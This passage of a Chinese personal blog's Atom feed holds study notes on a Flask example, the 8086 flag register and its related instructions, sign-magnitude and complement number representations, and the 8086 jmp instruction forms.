Web框架是在WSGI的上面又抽象出来一层，使之更易使用，编写的Python Web程序也更易维护。</p><p>我们以非常著名的Flask框架为例。重新实现一下上面的WSGI程序。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;h1&gt;Hello WSGi&lt;/h1&gt;'</span></span><br><span class="line"></span><br><span class="line">app.run()</span><br></pre></td></tr></table></figure><p>另外，Python还有很多流行的Web框架，例如Django，web.py、Tornado等，这里不在详细展开。</p><hr><p>参考资料:</p><ul><li><p><a href="https://zh.wikipedia.org/wiki/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%BD%91%E5%85%B3%E6%8E%A5%E5%8F%A3" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%BD%91%E5%85%B3%E6%8E%A5%E5%8F%A3</a></p></li><li><p>《Flask Web开发实战》</p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;WSGI全称为Python Web Server Gateway Interface，Python Web服务器网关接口，它是介于Web服务器和Web应用程序（或Web框架）之间的一种简单而通用的接口。&lt;/p&gt;
&lt;img src=&quot;/images/wsgi.jpg&quot;&gt;

&lt;
      
    
    </summary>
    
      <category term="Python" scheme="https://mingliangliu.com/categories/Python/"/>
    
    
      <category term="Python" scheme="https://mingliangliu.com/tags/Python/"/>
    
      <category term="Web" scheme="https://mingliangliu.com/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>汇编语言之标志寄存器</title>
    <link href="https://mingliangliu.com/2019/03/03/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E4%B9%8B%E6%A0%87%E5%BF%97%E5%AF%84%E5%AD%98%E5%99%A8/"/>
    <id>https://mingliangliu.com/2019/03/03/汇编语言之标志寄存器/</id>
    <published>2019-03-03T13:07:55.000Z</published>
    <updated>2019-08-04T16:31:45.424Z</updated>
    
    <content type="html"><![CDATA[<blockquote class="blockquote-center"><h1 id="标志寄存器"><a href="#标志寄存器" class="headerlink" title="标志寄存器"></a>标志寄存器</h1></blockquote><p>CPU内部的寄存器中，有一种特殊的寄存器（对于不同的机器，个数和结构都有可能不同）具有以下三个功能:</p><ul><li>用来存储某些相关指令的执行结果</li><li>用来为CPU执行相关的指令提供行为依据</li><li>用来控制CPU的相关工作方式</li></ul><p>这种特殊的寄存器在8086CPU中称为标志寄存器。8086的标志寄存器有16位，其中存储的信息通常被称为程序状态字(PSW)。</p><p>标志寄存器与其他寄存器不一样，其他寄存器是用来放数据的，都是整个寄存器具有一个含义，而标志寄存器是按位起作用的。</p><p>8086中的标志寄存器的结构如下图所示:</p><img src="/images/标志寄存器.jpg"><p>其中1、3、4、12、13、14、15位在8086中没有使用。另外对于有确切含义的每一位，我们称为标志位</p><h2 id="ZF标志"><a href="#ZF标志" class="headerlink" title="ZF标志"></a>ZF标志</h2><p>标志寄存器的第六位是ZF，零标志位。他是记录相关指令执行后，其结果是否位零。如果为零，那么zf=1,如果不为零，那么zf=0</p><p>比如指令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov ax, 1</span><br><span class="line">sub ax, 1</span><br></pre></td></tr></table></figure><p>执行后，ax的结果为0，所以zf=1</p><p>再比如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov ax, 2</span><br><span class="line">sub ax, 1</span><br></pre></td></tr></table></figure><p>执行后，ax的结果不为0，所以zf=0</p><div class="note success">            <p>在这里，有一点需要注意：在8086的指令集中，有的指令的执行是影响标志位的，比如add、sub、mul、div、inc、or、and等，它们大都是运算指令（进行逻辑或算数运算）；有的指令的执行对标志寄存器没有影响，比如mov、push、pop等，它们大都是传送指令。</p>          </div><h2 id="PF标志"><a href="#PF标志" class="headerlink" title="PF标志"></a>PF标志</h2><p>标志寄存器的第二位是PF，奇偶标志位。它记录相关指令执行后，其结果的所有bit位中1的个数是否位偶数。如果是偶数，pf=1，如果位奇数，pf=0</p><p>比如指令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov al, 1</span><br><span class="line">add al, 10</span><br></pre></td></tr></table></figure><p>执行后，al为00001011B，其中有3个1，所以pf=0</p><p>再比如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov al, 1</span><br><span class="line">or al, 2</span><br></pre></td></tr></table></figure><p>执行后结果为00000011B，其中有2个1，所以pf=1</p><h2 id="SF标志"><a href="#SF标志" class="headerlink" title="SF标志"></a>SF标志</h2><p>标志寄存器的第七位是SF，符号标志位。它记录相关指令执行后，其结果是否为负。如果为负，sf=1，如果非负，sf=0</p><p>这里要明确一点，在计算机中，通常用补码来表示有符号的数据，计算机中的一个数据既可以看作有符号数，也可以看作无符号数。不管我们如何看待，当CPU在进行运算的时候，就已经包含了两种含义，也将的到同一种信息来记录的两种结果。关键在于我们的程序需要那一种。</p><p>SF标志，是CPU对有符号数运算结果一种记录。如果我们将数据当作无符号数来运算，SF标志位则没有意义，虽然计算过程中影响了他的值。</p><p>我个人在这里的更简单写的理解是计算后结果的最高位是否为1，为1，这sf=1，否则，sf=0</p><p>比如指令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov al, 100000001B</span><br><span class="line">add al, 1</span><br></pre></td></tr></table></figure><p>执行后结果为10000010B，sf=1，表示如果进行的是有符号运算的话，则结果为负</p><p>再比如</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov al, 10000001B</span><br><span class="line">add al, 01111111B</span><br></pre></td></tr></table></figure><p>执行后，结果为0，sf=0，表示，如果进行的是有符号运算，这结果为非负</p><h2 id="CF标志"><a href="#CF标志" class="headerlink" title="CF标志"></a>CF标志</h2><p>标志寄存器的第0为是CF，仅为标志位。一般情况下，在进行 <em>无符号</em> 运算的时候，它记录了运算结果的最高有效位向更高有效位的进位，或从更高有效位的借位。</p><p>比如指令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov al, 98H</span><br><span class="line">add al, al  ; 执行后(al)=30H, CF=1, 产生进位</span><br><span class="line">add al, al  ; 执行后(al)=60H, CF=0, 没有进位，或者说进位为0</span><br></pre></td></tr></table></figure><p>再比如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov al, 97H</span><br><span class="line">sub al, 98H  ; 执行后(al)=FFH, CF=1, 产生借位</span><br><span class="line">sub al, al   ; 执行后(al)=0, CF=0, 借位为0</span><br></pre></td></tr></table></figure><h2 id="OF标志"><a href="#OF标志" class="headerlink" title="OF标志"></a>OF标志</h2><p>标志寄存器的第11位是OF，溢出标志位。一般情况下，OF记录了 <em>有符号数</em> 的运算结果是否发生了溢出。如果发生了溢出，of=1，如果没有，of=0</p><div class="note success">            <p>这里一定要注意的是CF和OF的区别，CF是对无符号数运算有意义的标志位，而OF是对有符号数运算有意义的标志位。 它们之间没有任何关系 </p>          </div><p>比如指令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov al, 98</span><br><span class="line">add al, 99</span><br></pre></td></tr></table></figure><p>执行后，of=1，发生溢出，没有进位</p><p>再比如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov al, 0F0H</span><br><span class="line">add al, 78H</span><br></pre></td></tr></table></figure><p>执行后：of=0，没有溢出</p><h2 id="DF标志"><a href="#DF标志" class="headerlink" title="DF标志"></a>DF标志</h2><p>标志寄存器的第10位是DF，方向标志位。在串传送指令中，控制每次操作后si、di的增减。</p><p>df=0，每次操作后si、di递增</p><p>df=1，每次操作后si、di递减</p><p>例如串传送指令<code>movsb</code>：</p><ul><li><p>格式：<code>movsb</code></p></li><li><p>功能：执行下面几步操作：1、((es) x 16 + (di)) = ((ds) x 16 + (si)) 2、如果df=0，(si)=(si)+1, (di)=(di)+1。如果df=1，则(si)=(si)-1, (di)=(di)-1</p></li></ul><p>另外还有<code>movsw</code>，这时候就是一次传送一个字了，相应的si和di的+1-1也就变更成了+2-2</p><p>一般，<code>movsb</code>和<code>movsw</code>一般配合指令<code>rep</code>指令使用，如<code>rep movsb</code>， 相当于</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s: movsb  ; 当然啦，在此之前要先设置cx寄存器</span><br><span class="line">   loop s</span><br></pre></td></tr></table></figure><h2 id="adc、sbb、cmp、pushf和popf指令"><a href="#adc、sbb、cmp、pushf和popf指令" class="headerlink" title="adc、sbb、cmp、pushf和popf指令"></a>adc、sbb、cmp、pushf和popf指令</h2><p>再没有标志寄存器的时候，我们进行加减运算最多只能进行16位的加减运算，这在实际的应用中显然是不够的，那么有了标志寄存器，在结合<code>adc</code>和<code>sbb</code>指令，我们就可以进行任意多位的数的加减法了</p><h3 id="adc指令"><a href="#adc指令" class="headerlink" title="adc指令"></a>adc指令</h3><p>adc是带进位的加法指令，它利用了CF上记录的进位值</p><ul><li>指令格式：adc 操作对象1，操作对象2</li><li>功能： 操作对象1 = 操作对象1 + 操作对象2 + CF</li></ul><p>比如：计算1EF000H + 201000H，结果放在ax（高16位）和bx（低16位）中：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov ax, 001EH</span><br><span class="line">mov bx, 0F000H</span><br><span class="line">add bx, 1000H</span><br><span class="line">adc ax, 0020H</span><br></pre></td></tr></table></figure><p>更多位数的数相加和以上同理</p><h3 id="sbb指令"><a href="#sbb指令" class="headerlink" title="sbb指令"></a>sbb指令</h3><p>sbb是借位减法指令，它利用了CF位上记录的借位值</p><ul><li>指令格式：sbb 操作对象1，操作对象2</li><li>功能：操作对象1 = 操作对象1 - 操作对象2 - CF</li></ul><p>比如：计算003E1000H - 00202000H，结果保存在ax，bx中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov bx, 1000H</span><br><span class="line">mov ax, 003EH</span><br><span class="line">sub bx, 2000H</span><br><span class="line">sbb ax, 0020H</span><br></pre></td></tr></table></figure><h3 id="cmp指令"><a href="#cmp指令" class="headerlink" title="cmp指令"></a>cmp指令</h3><p>cmp是比较指令，功能相当于减法指令，只是不保存结果。执行后，对标志寄存器产生影响</p><ul><li>cmp指令格式：cmp 操作对象1，操作对象2</li><li>功能：计算操作对象1 - 操作对象2，但不保存结果</li></ul><p>经过<code>cmp</code>计算后，我们就可以用<code>je</code>、<code>jne</code>、<code>jb</code>、<code>jnb</code>、<code>ja</code>、<code>jna</code>指令进行跳转了。</p><p>因为比较复杂，在这里就不具体说实现的细节了，具体在更。</p><h3 id="pushf和popf指令"><a href="#pushf和popf指令" class="headerlink" title="pushf和popf指令"></a>pushf和popf指令</h3><p>pushf的功能是将标志寄存器的值压栈，而popf是从栈中弹出数据送入标志寄存器</p><p>这两个指令为直接访问寄存器提供了一种方法</p><hr><p>在这里，我们讨论了六种寄存器，另外还有IF，TF，和AF没有讨论，具体再更</p><p>完</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote class=&quot;blockquote-center&quot;&gt;&lt;h1 id=&quot;标志寄存器&quot;&gt;&lt;a href=&quot;#标志寄存器&quot; class=&quot;headerlink&quot; title=&quot;标志寄存器&quot;&gt;&lt;/a&gt;标志寄存器&lt;/h1&gt;&lt;/blockquote&gt;

&lt;p&gt;CPU内部
      
    
    </summary>
    
      <category term="汇编语言" scheme="https://mingliangliu.com/categories/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    
    
      <category term="汇编语言" scheme="https://mingliangliu.com/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>原码反码和补码</title>
    <link href="https://mingliangliu.com/2019/02/28/%E5%8E%9F%E7%A0%81%E5%8F%8D%E7%A0%81%E5%92%8C%E8%A1%A5%E7%A0%81/"/>
    <id>https://mingliangliu.com/2019/02/28/原码反码和补码/</id>
    <published>2019-02-28T09:35:08.000Z</published>
    <updated>2019-08-04T16:31:45.361Z</updated>
    
    <content type="html"><![CDATA[<h1 id="原码反码和补码"><a href="#原码反码和补码" class="headerlink" title="原码反码和补码"></a>原码反码和补码</h1><p>这里我们只讨论有符号数。我们都知道数在机器中都是以二进制表示的，而且常用二进制数的最高位表示其的正负，0为正，1为负</p><h2 id="原码"><a href="#原码" class="headerlink" title="原码"></a>原码</h2><p>原码的表示法很简单，对于一个二进制数n,</p><ul><li>当n为正数时，n的原码是在n上增加一个符号位0</li><li>当n为负数时，n的原码是在n上增加一个符号位1</li><li>n为0时，在原码中，有两种表示0的方式：0.0000 1.0000</li></ul><h2 id="反码"><a href="#反码" class="headerlink" title="反码"></a>反码</h2><p>对于一个二进制数n</p><ul><li>当n为正数时，n的反码和原码相同</li><li>当n为负数时，n的反码的符号位为1，数值部分是原码的数值部分按位取反</li><li>在反码表示中，有两种不同形式的0：0.0000 1.1111</li></ul><h2 id="补码"><a href="#补码" class="headerlink" title="补码"></a>补码</h2><p>对于一个二进制数n</p><ul><li>当n为正数时，n的补码和n的原码相同</li><li>当n为负数时，n的补码的符号为为1，数值部分是将原码数值按位取反加1</li><li>当n为0时，在补码表示中，0的表示是唯一的：0.0000</li></ul><blockquote><p>tip: 一个数补码的补码等于这个数</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;原码反码和补码&quot;&gt;&lt;a href=&quot;#原码反码和补码&quot; class=&quot;headerlink&quot; title=&quot;原码反码和补码&quot;&gt;&lt;/a&gt;原码反码和补码&lt;/h1&gt;&lt;p&gt;这里我们只讨论有符号数。我们都知道数在机器中都是以二进制表示的，而且常用二进制数的最高位表示其的正负
      
    
    </summary>
    
      <category term="数字逻辑" scheme="https://mingliangliu.com/categories/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91/"/>
    
    
      <category term="数字逻辑" scheme="https://mingliangliu.com/tags/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91/"/>
    
  </entry>
  
  <entry>
    <title>汇编转移指令</title>
    <link href="https://mingliangliu.com/2019/02/09/%E6%B1%87%E7%BC%96%E8%BD%AC%E7%A7%BB%E6%8C%87%E4%BB%A4/"/>
    <id>https://mingliangliu.com/2019/02/09/汇编转移指令/</id>
    <published>2019-02-09T03:46:09.000Z</published>
    <updated>2019-08-04T16:31:45.457Z</updated>
    
    <content type="html"><![CDATA[<p>在8086CPU中，转移指令可分为如下几类  </p><ul><li>无条件转移指令，如jmp</li><li>条件转移指令，如jcxz</li><li>循环指令，如loop</li><li>过程</li><li>中断</li></ul><p>在此，只先讨论无条件转移中的jmp，其他东西以后再更</p><p>jmp为无条件转移指令，可以只修改IP，也可以同时修改CS和IP</p><h2 id="依据位移进行转移的jmp指令"><a href="#依据位移进行转移的jmp指令" class="headerlink" title="依据位移进行转移的jmp指令"></a>依据位移进行转移的jmp指令</h2><p>所谓依据位移呢，就是根据转移指令到要转移的目的地址之间相差的字节数来进行转移的，相差的字节数由编译器进行计算给出，在生成的机器指令中只包含相差的字节数，不包含目的地址，这样会是的程序更加的灵活</p><h3 id="jmp-short-标号"><a href="#jmp-short-标号" class="headerlink" title="jmp short 标号"></a>jmp short 标号</h3><p>这种格式的jmp指令实现的是段内短转移，他对IP的修改范围为-128~127，超过这个范围会报错</p><p>使用如下面的例子</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">codesg segment</span><br><span class="line">    start: mov ax,0</span><br><span class="line">           jmp short s</span><br><span class="line">           add ax,1</span><br><span class="line">        s: inc ax</span><br><span class="line">codesg ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><p>参照书上的总结就是：jmp short 标号 的功能为：（IP）=(IP)+8位位移</p><ul><li>8位位移=标号处的地址-jmp指令后的第一个字节的地址（为什么是指令后第一个字节的地址，是因为和cpu执行指令的方式有关）</li><li>short指明此处的位移为8位位移</li><li>8位位移的范围为-128~127，用补码表示</li><li>8位位移由编译程序在编译时算出</li></ul><h3 id="jmp-near-ptr-标号"><a href="#jmp-near-ptr-标号" class="headerlink" title="jmp near ptr 标号"></a>jmp near ptr 标号</h3><p>它和jmp short 标号的功能相似，不过是实现的段内近转移</p><p>它实现的功能为：（IP）=（IP）+ 16为位移，类似上面</p><ul><li>16位位移=标号处的地址-jmp指令后的第一个字节的地址</li><li>near ptr 指明此处的位移为16位位移，进行的是段内近转移</li><li>16位位移的范围为-32768~32767，用补码表示</li><li>16为位移由编译程序在编译时给出</li></ul><h2 id="转移的目的地址在指令中的jmp指令"><a href="#转移的目的地址在指令中的jmp指令" class="headerlink" title="转移的目的地址在指令中的jmp指令"></a>转移的目的地址在指令中的jmp指令</h2><p>前面的jmp指令只能进行段间的转移，但是我们有时候需要转移的“更远”，这时候就需要这种类型的指令了</p><h3 id="jmp-far-ptr-标号"><a href="#jmp-far-ptr-标号" class="headerlink" title="jmp far ptr 标号"></a>jmp far ptr 标号</h3><p>此指令实现的是段间转移，又称为远转移功能如下</p><ul><li>（CS）=标号所在段的段地址，（IP）=标号在段中的偏移地址</li><li>far ptr 指明了用标号的段地址和偏移地址修改CS和IP</li></ul><p>例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">codesg segment</span><br><span class="line"> start: mov ax,0</span><br><span class="line">        mov bx,0</span><br><span class="line">        jmp far ptr s</span><br><span class="line">        db 256 dup (0) ;这里用来占空</span><br><span class="line">     s: add ax,1</span><br><span class="line">        inc ax</span><br><span class="line">codesg ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><h2 id="转移地址在寄存器中的jmp指令"><a href="#转移地址在寄存器中的jmp指令" class="headerlink" title="转移地址在寄存器中的jmp指令"></a>转移地址在寄存器中的jmp指令</h2><h3 id="jmp-16位reg"><a href="#jmp-16位reg" class="headerlink" title="jmp 16位reg"></a>jmp 16位reg</h3><p>功能：（IP）=（16位reg）</p><h2 id="转移地址在内存中的jmp指令"><a href="#转移地址在内存中的jmp指令" class="headerlink" title="转移地址在内存中的jmp指令"></a>转移地址在内存中的jmp指令</h2><p>转移地址在内存中的jmp指令有两种格式：段内转移和段间转移</p><h3 id="jmp-word-ptr-内存单元地址（段内转移）"><a href="#jmp-word-ptr-内存单元地址（段内转移）" class="headerlink" title="jmp word ptr 内存单元地址（段内转移）"></a>jmp word ptr 内存单元地址（段内转移）</h3><p>功能：</p><ul><li>从内存单元地址处开始存放一个字，是转移的目的偏移地址</li><li>内存单元地址可用寻址方式的任一格式给出</li></ul><p>例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov ax,0123H</span><br><span class="line">mov ds:[0],ax</span><br><span class="line">jmp word ptr ds:[0]</span><br></pre></td></tr></table></figure><h3 id="jmp-dword-ptr-内存单元地址（段间转移）"><a href="#jmp-dword-ptr-内存单元地址（段间转移）" class="headerlink" title="jmp dword ptr 内存单元地址（段间转移）"></a>jmp dword ptr 内存单元地址（段间转移）</h3><p>功能：</p><ul><li>从内存单元地址处开始存放者两个字，高地址的字为转移的目的段地址，低地址处为转移的目的偏移地址</li><li>（CS）=（内存单元地址+2），（IP）= （内存单元地址）</li><li>内存单元地址可以用寻址方式的任何一种格式给出</li></ul><p>例如:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov ax,0123H</span><br><span class="line">mov ds:[0],ax</span><br><span class="line">mov word ptr ds:[2],0</span><br><span class="line">jmp dword ptr ds:[0]</span><br></pre></td></tr></table></figure><hr><p>本文总结自王爽的《汇编语言》，如有错误欢迎指正</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在8086CPU中，转移指令可分为如下几类  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;无条件转移指令，如jmp&lt;/li&gt;
&lt;li&gt;条件转移指令，如jcxz&lt;/li&gt;
&lt;li&gt;循环指令，如loop&lt;/li&gt;
&lt;li&gt;过程&lt;/li&gt;
&lt;li&gt;中断&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;在此，只先讨论
      
    
    </summary>
    
      <category term="汇编" scheme="https://mingliangliu.com/categories/%E6%B1%87%E7%BC%96/"/>
    
    
      <category term="汇编" scheme="https://mingliangliu.com/tags/%E6%B1%87%E7%BC%96/"/>
    
  </entry>
  
</feed>
